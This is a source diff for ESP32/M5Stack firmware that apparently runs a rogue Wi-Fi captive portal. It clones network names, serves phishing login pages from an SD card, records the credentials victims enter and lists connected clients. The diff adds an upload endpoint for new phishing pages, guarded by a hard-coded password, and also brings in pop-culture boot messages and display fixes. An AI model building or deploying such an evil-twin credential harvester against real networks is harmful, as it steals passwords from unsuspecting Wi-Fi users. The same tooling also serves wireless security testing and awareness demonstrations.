@@ -8,8 +8,6 @@ extern "C" {
   #include "esp_system.h"
 }
 
-
-
 static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;
 
 WebServer server(80);
@@ -25,18 +23,20 @@ int numSsid = 0;
 bool isOperationInProgress = false;
 int currentListIndex = 0;
 String clonedSSID = "";  
+int topVisibleIndex = 0; 
 
-// Connect to wifi CHANGE THIS !!!!! 
-const char* ssid = "WifiSSID"; // ssid to connect 
-const char* password = "WifiCore2Test"; // wifi password
-const char* accessWebPassword = "7h30th3r0n3"; //password for web access to remote check captured credentials
+// Connect to wifi network automaticaly  
+const char* ssid = ""; // ssid to connect 
+const char* password = ""; // wifi password
 
 
-String portalFiles[20]; // 20 portals max 
+ //password for web access to remote check captured credentials and send new html file
+const char* accessWebPassword = "7h30th3r0n3";
+
+String portalFiles[30]; // 30 portals max 
 int numPortalFiles = 0;
 String selectedPortalFile = "/sites/normal.html"; // defaut portal
 int portalFileIndex = 0; 
-
 
 
 int nbClientsConnected = 0;
@@ -48,6 +48,8 @@ bool isCaptivePortalOn = false;
 String macAddresses[10]; // 10 mac address max
 int numConnectedMACs = 0; 
 
+File fsUploadFile; // global variable for file upload
+
 
 
 void setup() {
@@ -58,34 +60,70 @@ void setup() {
   M5.Display.setTextFont(1);
 
   const char* startUpMessages[] = {
-    "Welcome Back!",
-    "Hack the Planet!",
-    "Accessing Mainframe...",
-    "Cracking Codes...",
+    "  There is no spoon...",
+    "    Hack the Planet!",
+    " Accessing Mainframe...",
+    "   Cracking Codes...",
     "Decrypting Messages...",
-    "Infiltrating the Network...",
-    "Bypassing Firewalls...",
+    "Infiltrating the Network.",
+    " Bypassing Firewalls...",
     "Exploring the Deep Web...",
     "Launching Cyber Attack...",
-    "Running Stealth Mode...",
-    "Gathering Intel...",
-    "Shara Conord?",
-    "Breaking Encryption...",
+    " Running Stealth Mode...",
+    "   Gathering Intel...",
+    "     Shara Conord?",
+    " Breaking Encryption...",
     "Anonymous Mode Activated.",
-    "Cybersecurity Breach Detected.",
+    " Cyber Breach Detected.",
     "Initiating Protocol 47...",
-    "The Gibson is in Sight.",
-    "Running the Matrix...",
+    " The Gibson is in Sight.",
+    "  Running the Matrix...",
     "Neural Networks Syncing...",
-    "Quantum Algorithms at Work...",
+    "Quantum Algorithm started",
     "Digital Footprint Erased.",
-    "Uploading Virus...",
-    "Downloading Data...",
-    "Root Access Granted.",
+    "   Uploading Virus...",
+    "Downloading Intenret...",
+    "  Root Access Granted.",
     "Cyberpunk Mode: Engaged.",
-    "Zero Days Exploited.",
+    "  Zero Days Exploited.",
     "Retro Hacking Activated.",
-    "Firewall: Deactivated."
+    " Firewall: Deactivated.",
+    "Riding the Light Cycle...",
+    "  Engaging Warp Drive...",
+    "  Hacking the Holodeck..",
+    "  Tracing the Nexus-6...",
+    "Charging at 2,21 GigaWatt",
+    "  Loading Batcomputer...",
+    "  Accessing StarkNet...",
+    "  Dialing on Stargate...",
+    "   Activating Skynet...",
+    " Unleashing the Kraken.."
+    " Accessing Mainframe...",
+    "  Booting HAL 9000...",
+    " Death Star loading ...",
+    " Initiating Tesseract...",
+    "  Decrypting Voynich...",
+    "Charging at 2,21 GigaWatt",
+    "   Hacking the Gibson...",
+    "   Orbiting Planet X...",
+    "  Accessing SHIELD DB...",
+    " Crossing Event Horizon.",
+    " Dive in the RabbitHole.",
+    "   Rigging the Tardis...",
+    " Sneaking into Mordor...",
+    "Manipulating the Force...",
+    "Decrypting the Enigma...",
+    "Jacking into Cybertron.",
+    "Casting a Shadowrun...",
+    "Navigating the Grid...",
+    "Surfing the Dark Web...",
+    "Engaging Hyperdrive...",
+    "Overclocking the AI...",
+    "   Bending Reality...",
+    "Scanning the Horizon...",
+    "Decrypting the Code...",
+    "Solving the Labyrinth...",
+    "Escaping the Matrix...",
   };
   const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);
 
@@ -117,21 +155,25 @@ void setup() {
   Serial.println(randomMessage);
   Serial.println("---------------------"); 
   firstScanWifiNetworks();
+  if (strcmp(ssid, "") != 0) {
+        WiFi.mode(WIFI_MODE_APSTA);
+        WiFi.begin(ssid, password);
 
-  WiFi.mode(WIFI_MODE_APSTA);
-  WiFi.begin(ssid, password);
-  
-unsigned long startAttemptTime = millis();
-while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
-    delay(500);
-    Serial.println("Trying to connect to Wifi..." );
-}
+        unsigned long startAttemptTime = millis();
 
-if (WiFi.status() == WL_CONNECTED) {
-    Serial.println("Connected to wifi !!!");
-} else {
-    Serial.println("Fail to connect to Wifi or timeout...");
-}
+        while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
+            delay(500);
+            Serial.println("Trying to connect to Wifi...");
+        }
+
+        if (WiFi.status() == WL_CONNECTED) {
+            Serial.println("Connected to wifi !!!");
+        } else {
+            Serial.println("Fail to connect to Wifi or timeout...");
+        }
+    } else {
+        Serial.println("SSID is empty, skipping Wi-Fi connection.");
+    }
   
   if (!SD.begin(SDCARD_CSPIN, SPI, 25000000)) {
     Serial.println("Error.. SD card not mounted...");
@@ -143,7 +185,7 @@ if (WiFi.status() == WL_CONNECTED) {
 xTaskCreate(
         backgroundTask, 
         "BackgroundTask", 
-        100000, /*stack*/
+        4096, /*stack*/
         NULL, 
         1, 
         NULL);
@@ -154,7 +196,7 @@ void backgroundTask(void *pvParameters) {
     for (;;) {
         dnsServer.processNextRequest();
         server.handleClient();
-        vTaskDelay(100); 
+        vTaskDelay(10); 
     }
 }
 
@@ -456,12 +498,60 @@ void createCaptivePortal() {
             server.send(403, "text/plain", "Unauthorized");
         }
     });
+
+      server.on("/uploadhtmlfile", HTTP_GET, []() {
+      if (server.arg("pass") == accessWebPassword) {
+        String html = "<form method='post' enctype='multipart/form-data' action='/upload'>";
+        html += "<input type='file' name='file' accept='*/*'><br>";
+        html += "<input type='submit' value='Upload'></form>";
+        server.send(200, "text/html", html);
+      } else {
+        server.send(403, "text/plain", "Unauthorized");
+      }
+    });
+    
+    server.on("/upload", HTTP_POST, []() {
+      server.send(200);
+    }, handleFileUpload);
+
+
+
     server.onNotFound([]() {
         servePortalFile(selectedPortalFile);
     });
 
     server.begin();
     waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
+}
+
+void handleFileUpload() {
+    HTTPUpload& upload = server.upload();
+    if (upload.status == UPLOAD_FILE_START) {
+        String filename = upload.filename;
+        filename.replace("/", "");
+        filename.replace("\\", "");
+        if (!filename.startsWith("/sites/")) filename = "/sites/" + filename;
+
+        // Ouvrir le fichier pour écriture
+        fsUploadFile = SD.open(filename, FILE_WRITE);
+        Serial.print("Upload Start: ");
+        Serial.println(filename);
+    } else if (upload.status == UPLOAD_FILE_WRITE) {
+        // Écrire les données dans le fichier
+        if (fsUploadFile) {
+            fsUploadFile.write(upload.buf, upload.currentSize);
+        }
+    } else if (upload.status == UPLOAD_FILE_END) {
+        // Fermer le fichier lorsque le téléversement est terminé
+        if (fsUploadFile) {
+            fsUploadFile.close();
+            Serial.print("Upload End: ");
+            Serial.println(upload.totalSize);
+            server.send(200, "text/plain", "File Uploaded Successfully");
+        } else {
+            server.send(500, "text/plain", "500: couldn't create file");
+        }
+    }
 }
 
 void servePortalFile(const String& filename) {
@@ -495,19 +585,22 @@ void stopCaptivePortal() {
   waitAndReturnToMenu("  Portal Stopped");
 }
 
-
 void listPortalFiles() {
     File root = SD.open("/sites");
     numPortalFiles = 0;
     while (File file = root.openNextFile()) {
         if (!file.isDirectory()) {
-            portalFiles[numPortalFiles++] = String("/sites/") + file.name();
-            if (numPortalFiles >= 10) break;
+            String fileName = file.name();
+            if (fileName.endsWith(".html")) {
+                portalFiles[numPortalFiles++] = String("/sites/") + fileName;
+                if (numPortalFiles >= 30) break;
+            }
         }
         file.close();
     }
     root.close();
 }
+
 
 void changePortal() {
     listPortalFiles();
@@ -516,25 +609,31 @@ void changePortal() {
     M5.Display.setTextColor(TFT_WHITE);
     M5.Display.setCursor(10, 10);
     M5.Display.println("Select Portal:");
-    
-    for (int i = 0; i < numPortalFiles; i++) {
+
+    int displayLimit = min(numPortalFiles, 10);
+
+    // Afficher les noms de fichier
+    for (int i = 0; i < displayLimit; i++) {
+        int displayIndex = (topVisibleIndex + i) % numPortalFiles;
         M5.Display.setCursor(10, 30 + i * 20);
-        if (i == portalFileIndex) {
+        if (displayIndex == portalFileIndex) {
             M5.Display.setTextColor(TFT_GREEN);
         } else {
             M5.Display.setTextColor(TFT_WHITE);
         }
-        M5.Display.println(portalFiles[i].substring(7)); 
+        M5.Display.println(portalFiles[displayIndex].substring(7));
     }
     M5.Display.display();
-    
+
     while (!inMenu) {
         M5.update();
         if (M5.BtnA.wasPressed()) {
-            portalFileIndex = max(0, portalFileIndex - 1);
+            portalFileIndex = (portalFileIndex - 1 + numPortalFiles) % numPortalFiles;
+            topVisibleIndex = (topVisibleIndex - 1 + numPortalFiles) % numPortalFiles;
             changePortal();
         } else if (M5.BtnC.wasPressed()) {
-            portalFileIndex = min(numPortalFiles - 1, portalFileIndex + 1);
+            portalFileIndex = (portalFileIndex + 1) % numPortalFiles;
+            topVisibleIndex = (topVisibleIndex + 1) % numPortalFiles;
             changePortal();
         } else if (M5.BtnB.wasPressed()) {
             selectedPortalFile = portalFiles[portalFileIndex];
@@ -543,6 +642,7 @@ void changePortal() {
         }
     }
 }
+
 
 
 String credentialsList[100]; // max 100 lignes parsed
@@ -568,11 +668,10 @@ void checkCredentials() {
     } else {
         const int lineHeight = 18; 
         const int maxLineLength = M5.Display.width() / 13; 
-        const int listDisplayLimit = M5.Display.height() / lineHeight - 2; // -2 pour tenir compte du décalage initial de 25 pixels
+        const int listDisplayLimit = M5.Display.height() / lineHeight - 2;
 
         int totalLines = 0;
         int listStartIndex = 0;
-        // Trouver l'index de départ et le nombre total de lignes
         for (int i = 0; i < numCredentials; i++) {
             int linesNeeded = (credentialsList[i].length() + maxLineLength - 1) / maxLineLength;
             if (i < currentListIndex) {
@@ -630,8 +729,6 @@ void checkCredentials() {
         }
     }
 }
-
-
 
 bool confirmDeletePopup() {
   bool confirm = false;
@@ -748,14 +845,17 @@ void displayMonitorPage2() {
     M5.Display.clear();
     M5.Display.setTextSize(2);
     updateConnectedMACs();
-
+    if (macAddresses[0] == "") { 
+        M5.Display.setCursor(10, 30);
+        M5.Display.println("No client connected");
+    } else {
     for (int i = 0; i < 10; i++) {
-        int y = 30 + i * 20; // Calculer la position Y pour chaque adresse MAC
-        if (y > M5.Display.height() - 20) break; // S'assurer de ne pas déborder de l'écran
+        int y = 30 + i * 20; 
+        if (y > M5.Display.height() - 20) break; 
 
         M5.Display.setCursor(10, y);
         M5.Display.println(macAddresses[i]);
-    }
+    }}
 
     M5.Display.display();
 
